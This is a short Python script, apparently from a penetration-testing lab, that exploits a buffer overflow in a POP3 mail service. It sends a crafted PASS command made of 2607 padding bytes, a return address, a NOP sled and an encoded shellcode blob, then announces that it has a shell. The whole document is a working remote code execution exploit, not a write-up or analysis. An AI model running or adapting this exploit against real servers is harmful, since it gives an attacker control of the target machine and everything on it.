#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
shell=("\xbd\xb6\x09\x62\x96\xda\xc7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x6b\x12\x83\xc3\x04\x03\xdd\x07\x80\x63\xdd\xf0\xc6"
"\x8c\x1d\x01\xa7\x05\xf8\x30\xe7\x72\x89\x63\xd7\xf1\xdf\x8f"
"\x9c\x54\xcb\x04\xd0\x70\xfc\xad\x5f\xa7\x33\x2d\xf3\x9b\x52"
"\xad\x0e\xc8\xb4\x8c\xc0\x1d\xb5\xc9\x3d\xef\xe7\x82\x4a\x42"
"\x17\xa6\x07\x5f\x9c\xf4\x86\xe7\x41\x4c\xa8\xc6\xd4\xc6\xf3"
"\xc8\xd7\x0b\x88\x40\xcf\x48\xb5\x1b\x64\xba\x41\x9a\xac\xf2"
"\xaa\x31\x91\x3a\x59\x4b\xd6\xfd\x82\x3e\x2e\xfe\x3f\x39\xf5"
"\x7c\xe4\xcc\xed\x27\x6f\x76\xc9\xd6\xbc\xe1\x9a\xd5\x09\x65"
"\xc4\xf9\x8c\xaa\x7f\x05\x04\x4d\xaf\x8f\x5e\x6a\x6b\xcb\x05"
"\x13\x2a\xb1\xe8\x2c\x2c\x1a\x54\x89\x27\xb7\x81\xa0\x6a\xd0"
"\x66\x89\x94\x20\xe1\x9a\xe7\x12\xae\x30\x6f\x1f\x27\x9f\x68"
"\x60\x12\x67\xe6\x9f\x9d\x98\x2f\x64\xc9\xc8\x47\x4d\x72\x83"
"\x97\x72\xa7\x04\xc7\xdc\x18\xe5\xb7\x9c\xc8\x8d\xdd\x12\x36"
"\xad\xde\xf8\x5f\x44\x25\x6b\xa0\x31\x3a\x7f\x48\x40\x44\x7e"
"\x33\xcd\xa2\xea\x53\x98\x7d\x83\xca\x81\xf5\x32\x12\x1c\x70"
"\x74\x98\x93\x85\x3b\x69\xd9\x95\xac\x99\x94\xc7\x7b\xa5\x02"
"\x6f\xe7\x34\xc9\x6f\x6e\x25\x46\x38\x27\x9b\x9f\xac\xd5\x82"
"\x09\xd2\x27\x52\x71\x56\xfc\xa7\x7c\x57\x71\x93\x5a\x47\x4f"
"\x1c\xe7\x33\x1f\x4b\xb1\xed\xd9\x25\x73\x47\xb0\x9a\xdd\x0f"
"\x45\xd1\xdd\x49\x4a\x3c\xa8\xb5\xfb\xe9\xed\xca\x34\x7e\xfa"
"\xb3\x28\x1e\x05\x6e\xe9\x2e\x4c\x32\x58\xa7\x09\xa7\xd8\xaa"
"\xa9\x12\x1e\xd3\x29\x96\xdf\x20\x31\xd3\xda\x6d\xf5\x08\x97"
"\xfe\x90\x2e\x04\xfe\xb0")
buffer="A"*2607 + "\x8f\x35\x4a\x5f" + "\x90" * 30 + shell
#\x90 = NOPS    NOP is most commonly used for timing purposes  Time to decode the payload
try:
    print "Exploiting Service"
    s.connect(('192.168.31.138',110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS'+buffer+'\r\n')
    print "WE HAVE A SHELL W00T"
except:
    print"Failed"
